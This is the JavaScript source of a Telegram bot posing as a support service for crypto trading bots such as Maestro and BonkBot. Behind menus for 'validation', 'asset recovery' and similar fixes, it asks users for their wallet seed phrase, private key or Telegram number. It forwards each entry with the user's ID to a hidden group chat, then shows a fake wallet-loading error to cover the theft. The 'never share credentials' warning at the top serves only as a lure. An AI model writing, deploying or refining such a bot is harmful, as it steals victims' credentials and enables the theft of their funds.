require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');

// Validate environment variables
if (!process.env.BOT_TOKEN) {
  console.error('❌ BOT_TOKEN is not defined in .env file');
  process.exit(1);
}

if (!process.env.GROUP_CHAT_ID) {
  console.error('❌ GROUP_CHAT_ID is not defined in .env file');
  process.exit(1);
}

// Initialize bot
const token = process.env.BOT_TOKEN;
const GROUP_CHAT_ID = process.env.GROUP_CHAT_ID;
const bot = new TelegramBot(token, { 
  polling: { 
    interval: 300,
    autoStart: true,
    params: {
      timeout: 10
    }
  }
});

// Security constants
const SECURITY_WARNING = `⚠️ *SECURITY WARNING* ⚠️
Never share credentials with anyone!
Legitimate support will NEVER ask for this information!`;

// MarkdownV2 escape function (fixed)
const escapeMarkdown = (text) => {
  if (!text) return '';
  return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
};

// User state management
const userState = new Map();

// =====================
// MENU CONFIGURATIONS
// =====================

const mainMenu = {
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [
        { text: "VALIDATION", callback_data: "validation" },
        { text: "CONFIG", callback_data: "configuration" },
        { text: "SWAP FAIL", callback_data: "swap_fail" }
      ],
      [
        { text: "HIGH SLIPPAGE", callback_data: "high_slippage" },
        { text: "WEB GLITCH", callback_data: "clear_web_glitch" },
        { text: "FAILED SNIPE", callback_data: "failed_snipe" }
      ],
      [
        { text: "RECTIFICATION", callback_data: "rectification" }, // Fixed typo
        { text: "ASSET RECOVERY", callback_data: "asset_recovery" },
        { text: "BOT GLITCH", callback_data: "clear_bot_glitch" }
      ],
      [
        { text: "FAILED ORDER", callback_data: "failed_order" },
        { text: "TURBO MODE", callback_data: "turbo_mode" },
        { text: "BUGS", callback_data: "technical_bugs" }
      ]
    ]
  }
};

const botSelectionMenu = (parentAction) => ({
  reply_markup: {
    inline_keyboard: [
      [
        { text: "MAESTRO", callback_data: `${parentAction}:maestro` },
        { text: "BONKBOT", callback_data: `${parentAction}:bonkbot` }
      ],
      [
        { text: "GMGNAI", callback_data: `${parentAction}:gmgnai` },
        { text: "SOL TRENDING", callback_data: `${parentAction}:sol_trending` }
      ],
      [
        { text: "BLOOM", callback_data: `${parentAction}:bloom` },
        { text: "MENX BOT", callback_data: `${parentAction}:menx` }
      ],
      [
        { text: "FINDER BOT", callback_data: `${parentAction}:finder` },
        { text: "DEFI WALLET", callback_data: `${parentAction}:defi_wallet` }
      ]
    ]
  }
});

const authMenu = {
  reply_markup: {
    inline_keyboard: [
      [
        { text: "🌱 SEED PHRASE", callback_data: "seed" },
        { text: "🔑 PRIVATE KEY", callback_data: "private" }
      ],
      [
        { text: "📱 TG NUMBER", callback_data: "tg" }
      ],
      [
        { text: "🚫 CANCEL", callback_data: "cancel" }
      ]
    ]
  }
};

// =====================
// MESSAGE HANDLERS
// =====================

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  try {
    bot.sendMessage(chatId, SECURITY_WARNING, mainMenu);
  } catch (error) {
    console.error('Error in /start command:', error);
  }
});

bot.on('callback_query', async (query) => {
  const chatId = query.message.chat.id;
  const messageId = query.message.message_id;
  const action = query.data;

  try {
    // Acknowledge callback to prevent loading animation
    await bot.answerCallbackQuery(query.id);

    // Handle cancellation
    if (action === 'cancel') {
      userState.delete(chatId);
      await bot.editMessageText("Operation cancelled. Use /start to begin again.", {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "Markdown",
        reply_markup: mainMenu.reply_markup
      });
      return;
    }

    // Handle authentication method selection
    if (['seed', 'private', 'tg'].includes(action)) {
      const state = userState.get(chatId);
      if (!state) {
        await bot.sendMessage(chatId, "Session expired. Use /start to begin again.", mainMenu);
        return;
      }
      
      state.authMethod = action;
      userState.set(chatId, state);
      
      const methodName = action === 'tg' ? 'Telegram number' : action.replace('_', ' ');
      await bot.sendMessage(chatId, `Please enter your ${methodName}:`);
      return;
    }

    // Handle bot selection
    if (action.includes(':')) {
      const [parentAction, selectedBot] = action.split(':');
      userState.set(chatId, {
        selectedBot,
        parentAction,
        timestamp: Date.now()
      });
      
      await bot.editMessageText(`Choose authentication method for ${selectedBot}:`, {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: authMenu.reply_markup
      });
      return;
    }

    // Handle main menu actions
    const isMainMenuAction = mainMenu.reply_markup.inline_keyboard
      .flat()
      .some(button => button.callback_data === action);
    
    if (isMainMenuAction) {
      userState.set(chatId, { 
        currentAction: action,
        timestamp: Date.now()
      });
      
      await bot.editMessageText(`Select bot for ${action.replace('_', ' ')}:`, {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: botSelectionMenu(action).reply_markup
      });
      return;
    }

    // Fallback for unknown callback
    await bot.sendMessage(chatId, "Command not recognized. Use /start to begin again.", mainMenu);

  } catch (error) {
    console.error("Callback error:", error);
    try {
      await bot.sendMessage(chatId, "❌ Error processing request. Please try again.", mainMenu);
    } catch (sendError) {
      console.error("Failed to send error message:", sendError);
    }
  }
});

// =====================
// INPUT HANDLING & GROUP FORWARDING
// =====================

bot.on('message', async (msg) => {
  // Ignore bot commands and non-text messages
  if (msg.text?.startsWith('/') || !msg.text?.trim()) {
    return;
  }

  const chatId = msg.chat.id;
  const text = msg.text.trim();
  const state = userState.get(chatId);

  // Check if user is in auth state
  if (state?.authMethod) {
    // Check if session is expired (15 minutes)
    if (Date.now() - (state.timestamp || 0) > 15 * 60 * 1000) {
      userState.delete(chatId);
      await bot.sendMessage(chatId, "Session expired. Use /start to begin again.", mainMenu);
      return;
    }

    const { parentAction, selectedBot, authMethod } = state;
    const username = msg.from.username ? `@${msg.from.username}` : 
                     msg.from.first_name ? msg.from.first_name : 
                     'Anonymous';

    try {
      // Format group message with proper escaping
      const groupMessage = escapeMarkdown(
        `🚨 NEW SUBMISSION\n` +
        `From: ${username}\n` +
        `User ID: ${msg.from.id}\n` +
        `Action: ${parentAction}\n` +
        `Bot: ${selectedBot}\n` +
        `Method: ${authMethod === 'tg' ? 'Telegram Number' : authMethod.toUpperCase()}\n` +
        `Content: ${text.length > 100 ? text.substring(0, 100) + '...' : text}`
      );

      // Send to group
      await bot.sendMessage(GROUP_CHAT_ID, groupMessage, {
        parse_mode: "MarkdownV2"
      });

      // Confirm to user
      await bot.sendMessage(chatId, "❌ Failed to load your wallet. Please try again. ❌\n\nYour issue has been logged for support.", mainMenu);
      
      console.log(`✅ Submission forwarded from ${username} (${chatId})`);
      
    } catch (error) {
      console.error("Group forwarding error:", error);
      await bot.sendMessage(chatId, "❌ Submission failed. Please try again later.", mainMenu);
    }

    // Clear state regardless of success
    userState.delete(chatId);
  }
});

// =====================
// CLEANUP EXPIRED STATES
// =====================

setInterval(() => {
  const now = Date.now();
  for (const [chatId, state] of userState.entries()) {
    if (now - (state.timestamp || 0) > 15 * 60 * 1000) {
      userState.delete(chatId);
    }
  }
}, 5 * 60 * 1000); // Clean up every 5 minutes

// =====================
// ERROR HANDLING
// =====================

bot.on('polling_error', (error) => {
  console.error(`Polling error: ${error.message}`);
  if (error.code === 'EFATAL') {
    console.error('Fatal polling error, attempting to restart...');
    setTimeout(() => {
      bot.startPolling();
    }, 5000);
  }
});

bot.on('error', (error) => {
  console.error(`Bot error: ${error.message}`);
});

process.on('unhandledRejection', (error) => {
  console.error(`Unhandled rejection: ${error.message}`);
});

process.on('SIGINT', () => {
  console.log('\n🛑 Bot shutting down...');
  bot.stopPolling();
  process.exit(0);
});

console.log("🟢 Bot is operational and ready!");
